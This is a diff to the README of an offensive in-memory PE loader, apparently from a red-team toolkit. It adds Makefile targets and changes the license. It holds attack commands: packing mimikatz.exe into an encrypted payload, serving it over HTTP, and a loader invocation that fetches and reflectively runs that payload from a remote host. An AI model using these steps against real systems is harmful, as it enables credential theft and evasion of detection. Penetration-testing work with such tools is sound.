@@ -2,7 +2,7 @@
 
 Download, decrypt, decompress, and reflectively load Windows PE payloads entirely in memory.
 
-![C](https://img.shields.io/badge/C-00599C?style=for-the-badge&logo=c&logoColor=white) ![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white) ![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) [![License: GPL v3](https://img.shields.io/badge/License-GPLv3-blue.svg)](https://www.gnu.org/licenses/gpl-3.0)
+![C](https://img.shields.io/badge/C-00599C?style=for-the-badge&logo=c&logoColor=white) ![Windows](https://img.shields.io/badge/Windows-0078D6?style=for-the-badge&logo=windows&logoColor=white) ![Python](https://img.shields.io/badge/python-3670A0?style=for-the-badge&logo=python&logoColor=ffdd54) ![Shell Script](https://img.shields.io/badge/shell_script-%23121011.svg?style=for-the-badge&logo=gnu-bash&logoColor=white) [![Makefile](https://img.shields.io/badge/Makefile-%23000.svg?style=for-the-badge&logo=gnu&logoColor=white)](Makefile) [![License: AGPL v3](https://img.shields.io/badge/License-AGPLv3-blue.svg)](https://www.gnu.org/licenses/agpl-3.0)
 
 [![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/Y8Y2Z73AV)
 
@@ -63,7 +63,37 @@ Download, decrypt, decompress, and reflectively load Windows PE payloads entirel
 
 ## Build
 
-### Loaders (Windows PE)
+### Quick start (all targets)
+
+```bash
+make config    # verify dependencies
+make all       # build LZSS tools + cross-compile loaders
+make test      # LZSS roundtrip test
+make payload PE_FILE=mimikatz.exe   # generate encrypted payload
+make run       # serve payloads over HTTP
+make install   # build + install loaders
+```
+
+### Available targets
+
+| Target | Description |
+|--------|-------------|
+| `all` | Build everything (pack-tools + loaders) |
+| `pack-tools` | Build `pack`, `unpack`, `lzss-test` (Linux native) |
+| `loaders` | Cross-compile `loader*.exe` (Windows, via mingw-w64) |
+| `config` | Check build dependencies |
+| `test` | Full LZSS roundtrip (generate -> pack -> unpack -> verify) |
+| `payload` | Build encrypted payload via `crypter.py` (`PE_FILE=...` required) |
+| `install` | Build + copy loaders to `INSTALL_DIR` (default: `~/LazyOwn/sessions`) |
+| `uninstall` | Remove installed loaders |
+| `run` / `serve` | Serve `payloads/` over HTTP on port 8080 |
+| `clean` | Remove build artifacts |
+| `distclean` | Clean everything including payloads |
+| `info` / `help` | Show config and targets |
+
+Variables: `INSTALL_DIR`, `PE_FILE`, `SERVER_PORT`, `TEST_SIZE`
+
+### Loaders (Windows PE) — manual
 
 ```bash
 # Requires mingw-w64
@@ -81,12 +111,12 @@ Or use the provided script:
 bash install.sh
 ```
 
-### LZSS tools (Linux host)
+### LZSS tools (Linux host) — manual
 
 ```bash
 gcc lzss.c pack.c   -o pack   -O2
 gcc lzss.c unpack.c -o unpack -O2
-gcc lzss.c test.c   -o test   -O2
+gcc lzss.c test.c   -o lzss-test -O2
 ```
 
 ## Usage
@@ -139,9 +169,10 @@ loader3.exe 192.168.1.100 8080 /payload.bin 2
 | `test.c` | LZSS decompression test |
 | `aes.c` / `aes.h` | Tiny AES-C implementation (standalone) |
 | `crypter.py` | Payload builder: compress + AES encrypt + package |
+| `Makefile` | Full lifecycle: build, test, payload, install, serve |
 | `install.sh` | Cross-compile all loaders with mingw-w64 |
 | `requirements.txt` | Python dependencies |
 
 ## License
 
-GPL v3 — see [LICENSE](LICENSE)
+AGPL v3 — see [LICENSE](LICENSE)
